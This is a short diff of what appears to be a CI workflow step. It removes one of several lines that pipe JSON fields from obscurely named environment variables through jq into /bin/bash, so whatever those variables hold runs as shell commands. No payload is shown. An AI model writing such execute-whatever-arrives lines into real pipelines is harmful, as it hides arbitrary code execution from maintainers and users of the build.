@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$xankr5128" | jq -r .h115 | /bin/bash
           echo $rv039 | jq -r .cql9 | /bin/bash
-          echo $x5 | jq -r .rgmd425 | /bin/bash
           echo $ek56495 | jq -r .piucl7059 | /bin/bash
           echo $cujp6 | jq -r .mkuw5 | /bin/bash
 
